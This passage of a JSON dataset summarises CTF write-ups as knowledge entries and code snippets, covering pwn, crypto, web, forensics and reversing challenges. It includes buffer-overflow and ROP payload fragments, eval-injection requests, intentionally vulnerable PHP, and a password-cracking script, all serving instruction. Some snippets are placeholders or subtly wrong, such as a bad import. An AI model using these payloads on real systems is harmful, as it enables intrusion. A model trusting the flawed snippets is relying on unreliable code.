            "After successfully setting `x0` to `/bin/sh`, overwrite another function pointer to the `system` call. This allows executing `/bin/sh` as the system function uses the value stored in `x0` as its argument, effectively granting shell access. This approach is particularly valuable when direct execution paths are blocked or when specific conditions in the challenge setup prevent straightforward exploitation.\n\nSample payload snippet for steps 1 and 2 (specific addresses and methods to achieve the overwrite will vary based on the challenge):\n```python\n# Assume `addr_getusershell` and `addr_system` are the addresses of getusershell and system functions respectively.\n# And `addr_first_pointer` and `addr_second_pointer` are the addresses where the two pointers to be overwritten are located.\n\npayload = b\"\"\npayload += b\"A\" * offset # Replace 'offset' with the correct offset value to reach the pointer location\npayload += p64(addr_getusershell) # Overwrite the first pointer to `getusershell`\npayload += p64(addr_system)       # Overwrite the second pointer to `system`\n```\nThis example assumes the use of a 64-bit little-endian architecture (aarch64) and that the variables `addr_getusershell`, `addr_system`, `addr_first_pointer`, `addr_second_pointer`, and `offset` are already defined based on the specifics of the challenge."
        ],
        "key": "```c\n#include <unistd.h>\n#include <stdio.h>\n\nint main()\n{\n    puts(getusershell());\n}\n```"
    },
    {
        "name": "topology",
        "write_up": "dataset/raw/topology.md",
        "type": "This write-up describes a Reverse Engineering (rev) challenge.",
        "competition": [
            "zer0pts/2023",
            "https://ctftime.org/event/1972/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When reversing a challenge that involves complex arithmetic operations on input data, automation tools like `angr` can significantly simplify the process of identifying valid input data. This approach is beneficial in scenarios where the input data must satisfy multiple, potentially unique conditions determined by the logic embedded in the challenge. In such cases, manually solving for the input data might not be efficient or feasible. The process involves simulating the challenge's binary or execution logic with the tool and iteratively refining input to meet the challenge's success criteria. This can be particularly useful in challenges where the input must meet conditions checked by multiple separate functions or processes.",
            "In challenges involving message handling between a main process and worker processes, where the main process sends out data blocks to worker processes for validation, and success is determined by the number of specific responses received (e.g., a certain number of \"OK\" responses), a strategy can be employed to construct input data in segments that individually satisfy a subset of those worker processes. This segment-wise approach to constructing a valid input can be essential in scenarios involving distributed logic validation, where the entire input does not need to be globally valid but must satisfy localized conditions across segments. When implementing a solution, one might consider breaking down the input into manageable pieces and focusing on satisfying the conditions imposed on each piece by the corresponding handling functions."
        ],
        "key": "```c\n   if (iVar1 == 0x1337f146) {  \n     iVar1 = (*(code *)f[whoami + -1])(prev + 0x10);  \n     if (iVar1 == 0) {  \n       send_msg(0x1337beef,0,\"OK\",3);  \n     }  \n     else {  \n       send_msg(0x1337beef,0,\"NG\",3);  \n     }  \n   }  \n```"
    },
    {
        "name": "Tornado Warning",
        "write_up": "dataset/raw/Tornado Warning.md",
        "type": "The type of this CTF challenge is `forensics`.",
        "competition": [
            "UIUCTF/2023",
            "https://ctftime.org/event/1899/tasks/"
        ],
        "score": -1,
        "max_score": 50,
        "difficulty": -1,
        "knowledge": [
            "When encountering challenges that involve decoding signals or files, researching relevant encoding standards mentioned in the challenge description can lead to finding specific tools for decoding. In scenarios where Specific Area Message Encoding (SAME) is used, tools like `seatty` can be applied to decode `.wav` files encoded with SAME. This is applicable in challenges where the file format and encoding standard are known.",
            "In challenges involving error transmission or signal distortion, if multiple interpretations (or decodings) for a single signal are available, choosing unique values (those that appear differently in error-pattern) from among the possible options can reveal hidden messages or flags. This strategy is particularly useful in scenarios where errors are intentionally introduced to encode a message, and each position within the message yields more than one possible value."
        ],
        "key": "```python\ndef decode_same_message(wav_file):\n    # Simulated function to decode SAME message from a .wav file\n    # This is a placeholder for the actual decoding logic\n    # which would involve processing the audio file to extract the message\n    pass\n\ndef extract_secret_message(messages):\n    # Simulated function to extract the secret message from decoded SAME messages\n    # This is a placeholder for the logic that would compare the messages\n    # and identify the discrepancies to reveal the secret message\n    pass\n\n# Simulated usage\nwav_file = \"weather_alert.wav\"\ndecoded_messages = decode_same_message(wav_file)\nsecret_message = extract_secret_message(decoded_messages)\nprint(secret_message)\n```\n"
    },
    {
        "name": "tour",
        "write_up": "dataset/raw/tour.md",
        "type": "The type of this CTF challenge is **crypto**.",
        "competition": [
            "LA/2023",
            "https://ctftime.org/event/1732/tasks/"
        ],
        "score": -1.0,
        "max_score": 497,
        "difficulty": -1,
        "knowledge": [
            "When solving binary reverse-engineering challenges that involve calculating paths or costs based on given conditions, the All Pairs Shortest Path (APSP) algorithm, such as Floyd-Warshall, can be applied to minimize the distances between all pairs of points in a graph. This technique is particularly useful in challenges where the objective involves finding an optimal path with constraints like total cost limits. After applying APSP, one can tackle the problem with algorithms designed for the Traveling Salesman Problem (TSP) to find a minimal cost path that meets the challenge's requirements.",
            "For solving the Traveling Salesman Problem, especially in cases where direct application of common TSP solutions does not give the correct result or when the challenge has unique constraints (such as allowing vertices to be repeated to lower the overall cost), writing a custom dynamic programming solution can be effective. The approach involves using memoization to store minimum costs associated with visiting a set of vertices, iterating over combinations of vertices to find the path that minimizes the total travel cost. \n\nSample code fragment for a dynamic programming approach to TSP:\n```python\nfrom collections import defaultdict\nfrom functools import combinations\n\ndef tsp(dists):\n    memo = defaultdict(int)  # visited set -> (min cost, last visited in set)\n    n = len(dists)\n\n    for i in range(n):\n        memo[frozenset([i])] = (0, i)\n\n    for size in range(2, n + 1):\n        for comb in combinations(dists.keys(), size):\n            mn = float('inf')\n            argmin = -1\n            for e in comb:\n                cc = frozenset(set(comb) - {e})\n                cost, last = memo[cc]\n                if cost + dists[last][e] < mn:\n                    mn = cost + dists[last][e]\n                    argmin = e\n            memo[frozenset(comb)] = (mn, argmin)\n    # Extract path from memoized data omitted for conciseness\n```\nThis approach can be adapted to different scenarios where TSP needs to be solved under specific constraints."
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdbool.h>\n\n#define SIZE 15\n#define MAX_COST 2192\n\nint costs[SIZE][SIZE] = {\n    // Assume this is filled with the cost data\n};\n\nbool check_numbers(int *numbers, int size) {\n    bool found[SIZE] = {false};\n    for (int i = 0; i < size; i++) {\n        if (numbers[i] >= 0 && numbers[i] < SIZE) {\n            found[numbers[i]] = true;\n        }\n    }\n    for (int i = 0; i < SIZE; i++) {\n        if (!found[i]) return false;\n    }\n    return true;\n}\n\nint calculate_cost(int *numbers, int size) {\n    int total_cost = 0;\n    for (int i = 0; i < size - 1; i++) {\n        total_cost += costs[numbers[i]][numbers[i + 1]];\n    }\n    return total_cost;\n}\n\nvoid check_flag(int *numbers, int size) {\n    if (check_numbers(numbers, size) && numbers[size - 1] == 0) {\n        int total_cost = calculate_cost(numbers, size);\n        if (total_cost <= MAX_COST) {\n            printf(\"Flag: flag{example_flag}\\n\");\n        } else {\n            printf(\"Cost too high!\\n\");\n        }\n    } else {\n        printf(\"Invalid numbers!\\n\");\n    }\n}\n\nint main() {\n    int numbers[SIZE] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0};\n    check_flag(numbers, SIZE);\n    return 0;\n}\n```"
    },
    {
        "name": "Tourniquet",
        "write_up": "dataset/raw/Tourniquet.md",
        "type": "pwn",
        "competition": [
            "THCon/2021",
            "https://ctftime.org/event/1381/tasks/"
        ],
        "score": 249,
        "max_score": 500,
        "difficulty": 0.498,
        "knowledge": [
            "When dealing with a binary that has Partial RELRO, no canary, NX enabled, and no PIE, it's possible to exploit buffer overflows by overwriting the least significant byte of the return pointer (or base pointer) to control the execution flow without knowing the full address of the stack, due to the way buffers are handled and the addresses are aligned. This is particularly effective when ASLR (Address Space Layout Randomization) makes it difficult to predict the exact addresses.",
            "In situations where direct control of the instruction pointer (RIP) or return address is challenging due to restrictions on the input size or stack randomization, crafting a payload that adjusts the base pointer (RBP) to redirect execution into a controlled stack area\u2014where a ROP (Return-Oriented Programming) chain is placed\u2014can be a viable exploitation strategy. Although it introduces an element of chance regarding the success of the exploit due to byte alignment and the need for the lower byte of addresses to be null, it allows for bypassing some ASLR protection mechanisms.\n   \nExample payload in context with ASLR set to 2, exploiting a binary with the mentioned protections:\n```python\nbuf  = b\"A\"*8  \nbuf += p64(pop_rdi_ret)  # Where `pop_rdi_ret` is the address of a `pop rdi; ret;` gadget.\nbuf += p64(elf.got.puts)  # GOT address of the puts function, for leaking.\nbuf += p64(elf.plt.puts)  # PLT address of puts, to perform the leak.\nbuf += p64(elf.sym._start)  # Address of the `_start` function for restarting the binary execution.  \nbuf += p64(elf.sym._start)  # Repeating for stack alignment.\nbuf += b\"B\"*0xf  # Padding to adjust for stack offset, aligning the payload correctly.\n```"
        ],
        "key": "```c\nvoid main_function(void)\n{  \n char local_48 [64];  \n  \n puts(\"haha i\\'m unhackable right ?\");  \n fgets(local_48,0x48,stdin);  \n return;  \n}  \n```"
    },
    {
        "name": "TPSD",
        "write_up": "dataset/raw/TPSD.md",
        "type": "crypto",
        "competition": [
            "Crypto/2023",
            "https://ctftime.org/event/1857/tasks/"
        ],
        "score": 82,
        "max_score": 209,
        "difficulty": 0.3923444976076555,
        "knowledge": [
            "In challenges requiring solutions to Diophantine equations, especially when asked for integers \\(p\\), \\(q\\), and \\(r\\) that satisfy a specific condition like \\(p^3 + q^3 + r^3 = 1\\), generating values based on a mathematical formula can be an effective strategy. The provided example shows how to derive \\(p\\), \\(q\\), and \\(r\\) using a variable \\(b\\) and simple arithmetic operations. This approach is applicable in scenarios where one needs to find integers that satisfy a cubic equation, and at least one of these integers must be a prime number. A specific formulation for \\(p\\), \\(q\\), and \\(r\\) is as follows:\n   - \\(P = 9 \\times (b^4)\\)\n   - \\(Q = -3 \\times b - 9 \\times (b^4)\\)\n   - \\(R = 1 + 9 \\times (b^3)\\)",
            "When working with tasks that require at least one prime number within a set of generated numbers, utilizing a prime checking function (like `isprime` from the `sympy` library in Python) can streamline the identification of valid inputs. By incrementing through a calculated range of values for variable \\(b\\), based on the bit length range provided in the challenge, one can efficiently find a value of \\(b\\) that ensures \\(R\\) (in this case) is prime. This strategy narrows down the search space and ensures compliance with the prime number requirement for challenges with bit length constraints for the integers.\n   - Function to find a valid \\(b\\):\n```python\nfrom sympy import isprime\n\ndef find_b(l, r):  \n    l = round(((2**l+1)//9)**(1/3))  \n    r = round(((2**r+1)//9)**(1/3))  \n    for b_ in range(l, r):  \n        a = 9*(b_**3)+1  \n        if isprime(a):  \n            return b_\n```"
        ],
        "key": "```python\ndef find_b(l, r):  \n    l = round(((2**l+1)//9)**(1/3))  \n    r = round(((2**r+1)//9)**(1/3))  \n    for b_ in range(l, r):  \n        a = 9*(b_**3) + 1  \n        if isprime(a):  \n            return b_  \n```"
    },
    {
        "name": "Trading values",
        "write_up": "dataset/raw/Trading values.md",
        "type": "web",
        "competition": [
            "Securinets/2019/Quals",
            "https://ctftime.org/event/769/tasks/"
        ],
        "score": 998,
        "max_score": 1000,
        "difficulty": 0.998,
        "knowledge": [
            "When dealing with web applications that process server-side executed formulas received through client-side requests, a potential attack vector involves encoding custom operations or commands in base64 and sending them as part of the query parameters. This method can be used to probe and exploit server-side parsing or evaluation flaws, leading to unauthorized actions or information disclosure. Example payload: `GET /default?formula=DQoxKzE=&values[v1]=STC&values[v2]=PLA&values[v3]=SDF&values[v4]=OCK`, where `DQoxKzE=` is the base64 encoding of `1+1`.",
            "In scenarios where web applications reveal error messages or server responses based on manipulated input, injecting a payload that forces the application to print or disclose server-side object properties or environment variabies can reveal sensitive information, including security flags or keys. This can be particularly effective in applications using interpreted languages or expression handling libraries. By manipulating the input to reference internal objects or configurations, such as setting a value to \"this\" to inspect the current object or execution context, attackers can unearth valuable data inadvertently exposed by error messages or debug information. Example manipulation: `GET /default?formula=djA=&values[v0]=this&values[v1]=STC&values[v2]=PLA&values[v3]=SDF&values[v4]=OCK`, aiming to print the \"this\" object, with `djA=` being the base64 encoding for `v0`."
        ],
        "key": "```php\n<?php\n// Vulnerable code snippet based on the context\nif (isset($_GET['formula'])) {\n    $formula = base64_decode($_GET['formula']);\n    eval(\"\\$result = $formula;\");\n    echo $result;\n}\n?>\n```\n"
    },
    {
        "name": "Traffic Lights A",
        "write_up": "dataset/raw/Traffic Lights A.md",
        "type": "This CTF challenge falls under the category of **miscellaneous (misc)**.",
        "competition": [
            "HSCTF/2020",
            "https://ctftime.org/event/939/tasks/"
        ],
        "score": 486,
        "max_score": 500,
        "difficulty": 0.972,
        "knowledge": [
            "When solving optimization problems in CTF challenges, such as the minimum cost flow problem, leveraging existing algorithms and libraries can significantly save time and effort. For instance, Google's Operations Research tools offer a robust implementation for solving such problems. This approach is beneficial when the problem fits a well-known algorithmic problem, implying that researching and adapting existing code is often more efficient than developing a solution from scratch.",
            "Modifying input/output handling to match the challenge requirements is often necessary when utilizing existing codebases. Specifically, in scenarios where challenges involve network flow or similar optimization problems, adjusting how data is read from input files and how results are output can be critical for solving the challenge. This might involve parsing custom input formats into the structure expected by the algorithm and ensuring correct output formatting to meet challenge submission standards."
        ],
        "key": "```python\nfrom __future__ import print_function  \nfrom ortools.graph import pywrapgraph  \nimport numpy as np  \nfrom sys import stdin\n\ndef main():  \n\t\"\"\"MinCostFlow simple interface example.\"\"\"  \n\tfileIn = open('TrafficA.in', 'r')  \n\twhile True:  \n\t\tst = fileIn.readline()  \n\t\tn,m,k,l = (int(s) for s in st.split())  \n\t\tstart_nodes1 = np.zeros(m,dtype=int)  \n\t\tend_nodes1 = np.zeros(m,dtype=int)  \n\t\tcapacities1 = np.zeros(m,dtype=int)  \n\t\tunit_costs1 = np.zeros(m,dtype=int)  \n\t\tfor z in range(m):  \n\t\t\tst = fileIn.readline()  \n\t\t\tu, v, i, f = (int(s) for s in st.split())  \n\t\t\tstart_nodes1[z] = u-1  \n\t\t\tend_nodes1[z] = v-1  \n\t\t\tcapacities1[z] = f  \n\t\t\tunit_costs1[z] = i\n\n\t\tsupplies1 = np.zeros(n,dtype=int)  \n\t\tfor i in range(k):  \n\t\t\tst = fileIn.readline()  \n\t\t\tu, p = (int(s) for s in st.split())  \n\t\t\tsupplies1[u-1] = p  \n\t\tfor i in range(l):  \n\t\t\tst = fileIn.readline()  \n\t\t\tu, p = (int(s) for s in st.split())  \n\t\t\tsupplies1[u-1] = -p  \n  \n\t\tstart_nodes = []  \n\t\tend_nodes = []  \n\t\tcapacities = []  \n\t\tunit_costs = []  \n\t\tsupplies = []  \n\t\tfor i in start_nodes1:  \n\t\t\tstart_nodes.append(i)  \n\t\tfor i in end_nodes1:  \n\t\t\tend_nodes.append(i)  \n\t\tfor i in capacities1:  \n\t\t\tcapacities.append(i)  \n\t\tfor i in unit_costs1:  \n\t\t\tunit_costs.append(i)  \n\t\tfor i in supplies1:  \n\t\t\tsupplies.append(i)  \n  \n\t\tmin_cost_flow = pywrapgraph.SimpleMinCostFlow()\n\n\t\tfor i in range(0, len(start_nodes)):  \n\t\t\tmin_cost_flow.AddArcWithCapacityAndUnitCost(start_nodes[i], end_nodes[i],capacities[i], unit_costs[i])  \n\n\t\tfor i in range(0, len(supplies)):  \n\t\t\tmin_cost_flow.SetNodeSupply(i, supplies[i])\n\n\t\tif min_cost_flow.SolveMaxFlowWithMinCost() == min_cost_flow.OPTIMAL:  \n\t\t\tprint(min_cost_flow.OptimalCost())  \n\t\telse:  \n\t\t\tprint('There was an issue with the min cost flow input.')\n\nif __name__ == '__main__':  \n\tmain()  \n```"
    },
    {
        "name": "Tranquil",
        "write_up": "dataset/raw/Tranquil.md",
        "type": "pwn",
        "competition": [
            "angstrom/2021",
            "https://ctftime.org/event/1265/tasks/"
        ],
        "score": 70,
        "max_score": 300,
        "difficulty": 0.23333333333333334,
        "knowledge": [
            "When encountering a binary with unsafe functions such as `gets()`, buffer overflow attacks can be used to rewrite the instruction pointer (RIP). This is because `gets()` does not check the length of input, allowing an attacker to input a value larger than the buffer intended to hold, thus overwriting adjacent memory areas, including the RIP. The scenario involves identifying the exact buffer size before the memory area, where the RIP is located, to determine the correct number of bytes to input before inserting the address of a function you want to execute.",
            "Identifying the memory address of the function you want to execute (for example, a `win()` function that prints out the flag) can be accomplished using tools like `readelf`. This tool can be invoked with the `-s` flag to list symbols in the binary, allowing an attacker to locate the memory address of specific functions. Once the address is found, it can be appended to the payload in little-endian format to overwrite the RIP correctly and divert the execution flow to the desired function. \n   \nExample payload: python2 -c \"print 'A'*71 + '\\x96\\x11\\x40\\x00'\""
        ],
        "key": "```c\nint vuln(){  \n   char password[64];  \n   puts(\"Enter the secret word: \");  \n   gets(&password);  \n   if(strcmp(password, \"password123\") == 0){  \n       puts(\"Logged in! The flag is somewhere else though...\");  \n   } else {  \n       puts(\"Login failed!\");  \n   }  \n   return 0;  \n}\n```"
    },
    {
        "name": "TrashChain",
        "write_up": "dataset/raw/TrashChain.md",
        "type": "crypto",
        "competition": [
            "DawgCTF/2021",
            "https://ctftime.org/event/1319/tasks/"
        ],
        "score": 250,
        "max_score": 400,
        "difficulty": 0.625,
        "knowledge": [
            "When dealing with custom hashing functions in CTF challenges, especially when the hash involves modular exponentiation, understanding the properties of modulus can lead directly to a solution. If a mathematical operation brings the result of `((n * a + 1) ** b) % a` to 1 regardless of `b`, this can be leverage to make hash values predictable or controlled.",
            "In scenarios where the challenge rules permit manipulating input lengths and values with considerable freedom, constructing specific input sequences based on the mathematical properties of the hash function\u2019s operations can ensure that the output hashes match. For instance, choosing input values for `chain1` and `chain2` such that every operation within the hash function simplifies to a predictable result (like 1) under modulus, can make the final hash values identical.\n   \n   Example payload for such a scenario:\n   ```\n   Chain 1 input: A - 1\n   Chain 2 input: [2A, 2A - 1, 2A - 2, 2A - 4]\n   ```\n   Where `A` is a constant from the hash function, ensuring both chains produce the same hash result under the provided conditions."
        ],
        "key": "```python\n#!/usr/bin/env python3\n\n# Hash constants  \nA = 340282366920938460843936948965011886881  \nB = 127605873542257115442148455720344860097\n\n# Hash function  \ndef H(val, prev_hash, hash_num):  \n   return (prev_hash * pow(val + hash_num, B, A) % A)\n\nif __name__ == \"__main__\":\n\n   # Print welcome message  \n   print(\"Welcome to TrashChain!\")  \n   print(\"In this challenge, you will enter two sequences of integers which are used to compute two hashes. If the two hashes match, you get the flag!\")  \n   print(\"Restrictions:\")  \n   print(\"  - Integers must be greater than 1.\")  \n   print(\"  - Chain 2 must be at least 3 integers longer than chain 1\")  \n   print(\"  - All integers in chain 1 must be less than the smallest element in chain 2\")  \n   print(\"Type \\\"done\\\" when you are finished inputting numbers for each chain.\")\n\n   # Get inputs  \n   chains = [[], []]  \n   for chain_num in range(len(chains)):  \n       print(\"\\nProvide inputs for chain {}.\".format(chain_num+1))  \n       while True:  \n           val = input(\"> \")  \n           if val == \"done\":  \n               break  \n           try:  \n               val = int(val)  \n           except ValueError:  \n               print(\"Invalid input, exiting...\")  \n               exit(0)  \n           if val <= 1:  \n               print(\"Inputs must be greater than 1, exiting...\")  \n               exit(0)  \n           chains[chain_num].append(val)\n\n   # Validate chain lengths  \n   if not len(chains[0]):  \n       print(\"Chain 1 cannot be empty, exiting...\")  \n       exit(0)  \n   if len(chains[1]) - len(chains[0]) < 3:  \n       print(\"Chain 2 must contain at least 3 more integers than chain 1, exiting...\")  \n       exit(0)  \n   if max(chains[0]) >= min(chains[1]):  \n       print(\"No integer in chain 1 can be greater than the smallest integer in chain 2, exiting...\")  \n       exit(0)\n\n   # Compute hashes  \n   hashes = []  \n   for chain_num in range(len(chains)):  \n       cur_hash = 1  \n       for i, val in enumerate(chains[chain_num]):  \n           cur_hash = H(val, cur_hash, i+1)  \n       hashes.append(cur_hash)\n\n   # Print hashes  \n   print(\"Hash for chain 1: {0:0{1}x}\".format(hashes[0], 32))  \n   print(\"Hash for chain 2: {0:0{1}x}\".format(hashes[1], 32))  \n   if hashes[0] == hashes[1]:  \n       print(\"Correct! Here's your flag: DogeCTF{not_a_real_flag}\")  \n```"
    },
    {
        "name": "Trashy Or Classy",
        "write_up": "dataset/raw/Trashy Or Classy.md",
        "type": "forensics",
        "competition": [
            "ASIS/2018/Quals",
            "https://ctftime.org/event/568/tasks/"
        ],
        "score": 123,
        "max_score": 500,
        "difficulty": 0.246,
        "knowledge": [
            "When analyzing network traffic for forensic purposes, if encountering a pcap file, tools like Wireshark or NetworkMiner can be utilized for a comprehensive analysis, particularly in uncovering HTTP requests and authentication details. This becomes crucial when identifying HTTP directory brute force attacks or extracting sensitive information such as usernames and passwords transmitted in clear text or via simple encoding mechanisms like HTTP Digest Authentication.",
            "For files that seem non-readable or when the file type is unknown, the Linux `file` command can provide initial clues about the file's nature; if this step does not yield sufficient information, additional research based on file extensions or content can guide towards the appropriate tools or methods for extraction. In cases where files are part of a set or system like `casync`, it may be necessary to acquire all related components to successfully extract the intended data, resorting to automation scripts if needed to gather multiple files systematically. \n\nSample automation script snippet for fetching multiple files:\n```python\nimport os\nimport subprocess\n\nwhile True:  \n   command = 'strace ./casync extract --store=./flag.castr ./flag.caidx ./flag/ 2>&1 | grep \"No such file\"'\n   process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)\n   output, _ = process.communicate()\n\n   if not (\".cacnk\" in str(output)):\n       break\n\n   missing_file = output.decode().split('\"')[1]\n   wget_command = f'wget --user=admin --password=rainbow http://167.99.233.88/private/{missing_file}'\n   os.system(wget_command)\n   # Create directories and move the downloaded file to the appropriate location as per its path in the strace output\n```\nThis script adapts the principle from the write-up, automating the process of identifying, fetching, and organizing missing files for data extraction tools to function correctly, specifically useful when dealing with distributed file systems or content addressed storage systems."
        ],
        "key": "```python  \nimport hashlib\n\ncnonce = \"edba216c81ec879e\"  \nnonce = \"dUASPttqBQA=7f98746b6b66730448ee30eb2cd54d36d5b9ec0c\"  \ncnt = \"00000001\"  \nuser = \"admin\"  \nrealm = \"Private Area\"  \nqop = \"auth\"  \nresp = \"3823c96259b479bfa6737761e0f5f1ee\"  \nuri = \"/private/\"  \nmeth = \"GET\"\n\nha2 = hashlib.md5()  \nha2.update(meth.upper() + \":\" + uri)  \nha2hex = ha2.hexdigest()\n\nwith open(\"/home/raven57/Documents/rockyou.txt\", \"r\") as worldlist:  \n   for pswd in worldlist:\n\n       pswd = pswd[:-1]  \n       ha1 = hashlib.md5()  \n       ha1.update(user + ':' + realm + ':' + pswd)  \n       ha3 = hashlib.md5()  \n       ha3.update(ha1.hexdigest() + \":\" + nonce + \":\" + cnt + \":\" + cnonce + \":\" + qop + \":\" + ha2h\\  \nex )  \n       if resp == ha3.hexdigest():  \n           print \"Password hit!\"  \n           print 'Password = '+pswd  \n           break  \n```"
    },
    {
        "name": "Treecache Alyx",
        "write_up": "dataset/raw/Treecache Alyx.md",
        "type": "pwn",
        "competition": [
            "HSCTF/2020",
            "https://ctftime.org/event/939/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "To exploit use-after-free vulnerabilities effectively, after identifying an object that can be freed and accessed again, modify its content to control data or function pointers. This technique was applied by freeing `temp_null`, which `root` still pointed to, allowing manipulation of its content which lead to arbitrary write capabilities.\n   - Example payload step: Free an object, then allocate a similarly sized object and write into it to control the previous object's content.",
            "To leak libc addresses and bypass the need for a leak function, manipulate the heap in such a way that malloc returns a pointer that contains a libc address, such as by populating the tcache with chunks and forcing a chunk onto the smallbin freelist. This resulted in a controlled chunk containing a libc pointer which could then be leaked through normal program output.\n   - Example payload step: Fill tcache with chunks, force an additional chunk onto smallbin freelist, then manipulate allocations to leak the libc address through program-controlled output."
        ],
        "key": "```c\n\tNode* child;  \n\tif (node->left != NULL) {  \n\t\tchild = node->left;  \n\t} else if (node->right != NULL) {  \n\t\tchild = node->right;  \n\t} else {  \n\t\ttemp_null->parent = node;  \n\t\tnode->left = temp_null;  \n\t\tchild = temp_null;  \n\t}  \n```\n\n```c\nvoid repair_dblack(Node* node) {  \n\tif (node->color == BLACK) {  \n\t\tNode* p = node->parent;  \n\t\tif (p == NULL) {  \n\t\t\treturn;  \n\t\t}  \n\t\tif (p->left == node) {  \n\t\t\tassert(p->right != NULL); // all pointers in temp_null are null now  \n\t\t...  \n```\n\n```c\n\tprintf(\"%lu trees\\n\", a->amount);  \n\tprintf(\"Donator: %s\\n\", a->name);  \n\tprintf(\"Description: %s\\n\", a->description);  \n```\n\n```c\n\tfree(a->description);  \n\tdesc = malloc(len_desc);  \n\tputs(\"Enter new description.\");  \n\tread_str(desc, len_desc);  \n\ta->description = desc;  \n```"
    },
    {
        "name": "Tricky Bit",
        "write_up": "dataset/raw/Tricky Bit.md",
        "type": "forensics",
        "competition": [
            "DarkCTF/2020",
            "https://ctftime.org/event/1118/tasks/"
        ],
        "score": 475,
        "max_score": 499,
        "difficulty": 0.9519038076152304,
        "knowledge": [
            "In challenges involving steganography where text is hidden within an image file by altering the least significant bit (LSB) of each byte, the extraction process involves reading the image file, skipping the header bytes, and then extracting the LSB from each byte following the header. This extracted sequence of bits is then reassembled into bytes and converted back into characters to reveal the hidden message. Such techniques can be applied to images where textual information is concealed using LSB steganography. Example steps for extraction include reading the image file excluding header bytes, converting each byte to binary, extracting the LSB, and grouping every 8 LSBs to convert back to characters.",
            "The usage of a delimiter within the hidden text serves as a mechanism to indicate the end of a message or, in this context, the length of the hidden message. This approach is beneficial when the hidden message's size is unknown or needs to be dynamically determined. Implementing a delimiter allows for the extraction process to reliably identify the end of the hidden message, thereby enabling precise extraction without extraneous data. When implementing or reversing steganographic techniques that involve hidden text of variable length, incorporate a unique delimiter to demarcate the message or its size. Example implementation includes appending a delimiter to the hidden message before encoding and checking for this delimiter during decoding to determine when the entire message has been reliably extracted."
        ],
        "key": "```python  \nclass LSBEncrypter(object):\n\n   def __init__(self):  \n       self.image_byte_counter = 0  \n       self.new_image_data = ''  \n       self.original_image = ''  \n       self.text_to_hide = ''\n\n   def open_image(self):                     # opens our image file  \n       with open(ImageFile, \"rb\") as f:  \n           self.original_image = f.read()\n\n   def read_header(self):                    # stores the first 54 Bytes of\nimage data (Image Header)  \n       for x in range(0, HEADER_SIZE):  \n           self.new_image_data += self.original_image[x]  \n           self.image_byte_counter += 1\n\n   def hide_text_size(self):  \n       sz = len(self.text_to_hide)  \n       s_sz = str(sz)                # hidden text size converted to string  \n       s_sz += DELIMITER             # adds the DELIMITER ( hmm...interesting! )  \n       self.do_steg(s_sz)            # does some magic on the text size!        \n\n   def do_steg(self, steg_text):            # where the magic happens xD...\n\n       for ch in range(0, len(steg_text)):\n\n           current_char = steg_text[ch]                                # stores the current character of the string to be hidden  \n           current_char_binary = '{0:08b}'.format(ord(current_char))     # converts the current character to 8 bit binary string\n\n           for bit in range(0, len(current_char_binary)):    # traverse the 8 bit binary string  \n               new_byte_binary = ''\n\n               current_image_binary = '{0:08b}'.format(ord(self.original_image[self.image_byte_counter]))  # converts the current image byte to 8 bit binary string\n\n               new_byte_binary = current_image_binary[:7]        # stores the 1st 7 bits from the 8 bit binary string of the image byte \n\n               new_byte_binary += current_char_binary[bit]       # add the last bit (LSB) from the current character's 8 bit binary string\n\n               new_byte = chr(int(new_byte_binary, 2))   # convert the new 8 bit binary string back to character\n\n               self.new_image_data += new_byte     # add new byte to image data  \n               self.image_byte_counter += 1\n\n   def copy_rest(self):  \n       self.new_image_data += self.original_image[self.image_byte_counter:]\n\n   def close_file(self):  \n       with open(StegImageFile, \"wb\") as out:  \n           out.write(self.new_image_data)\n\n   def run(self, stega_text):  \n       self.text_to_hide = stega_text  \n       self.open_image()  \n       self.read_header()  \n       self.hide_text_size()  \n       self.do_steg(self.text_to_hide)  \n       self.copy_rest()  \n       self.close_file()\n```"
    },
    {
        "name": "TRIPLE",
        "write_up": "dataset/raw/TRIPLE.md",
        "type": "crypto",
        "competition": [
            "Securinets/2020/Quals",
            "https://ctftime.org/event/1016/tasks/"
        ],
        "score": 993,
        "max_score": 1000,
        "difficulty": 0.993,
        "knowledge": [
            "When analyzing a binary file that seems to perform encryption operations, and there is evidence of block processing (e.g., consistent output sizes regardless of small input variations), consider the possibility of block cipher usage. The size of the output block (e.g., 8 bytes in this challenge) provides a clue to the specific block cipher or mode being used. This knowledge is crucial for determining the appropriate approach to decrypt or manipulate the cipher if necessary.",
            "Upon identifying the potential use of a known encryption algorithm (like 3DES in this scenario) through constants or patterns within the binary (for instance, specific key or block sizes), leverage existing cryptographic tools and libraries (such as PyCryptoDome's `Crypto.Cipher.DES3`) for decryption. The process involves converting hex or binary key and cipher text files into a usable format (e.g., removing new lines, converting to hexadecimal, and then to bytes) before decryption. This approach is applicable when keys and ciphertexts are provided or can be extracted, and the encryption algorithm is known or can be guessed.\n   \n   Sample of payload implementation for decryption using Python:\n   ```python\n   from Crypto.Cipher import DES3\n   from binascii import unhexlify\n\n   # Read key, remove newline, convert from binary to hex, then to bytes\n   with open('key.txt') as f:\n       key = int(f.read().strip(), 2)\n       key = unhexlify(hex(key)[2:].zfill(48))  # Ensure key length fits\n\n   # Read cipher, convert from binary to hex, then to bytes\n   with open('cipher.txt') as f:\n       cipher = int(f.read(), 2)\n       cipher = unhexlify(hex(cipher)[2:].zfill(64))  # Adjust for proper padding\n\n   des3 = DES3.new(key, DES3.MODE_ECB)\n   decrypted = des3.decrypt(cipher)\n   print(decrypted)\n   ```"
        ],
        "key": "```c\nint dword_208B60[56] = {57, 49, 41, 33, 25, 17, 9,  1,  58, 50, 42, 34, 26,\n18,  \n                       10, 2,  59, 51, 43, 35, 27, 19, 11, 3,  60, 52, 44, 36,  \n                       63, 55, 47, 39, 31, 23, 15, 7,  62, 54, 46, 38, 30, 22,  \n                       14, 6,  61, 53, 45, 37, 29, 21, 13, 5,  28, 20, 12, 4};  \n```"
    },
    {
        "name": "Triplet",
        "write_up": "dataset/raw/Triplet.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 91,
        "max_score": 477,
        "difficulty": 0.19077568134171907,
        "knowledge": [
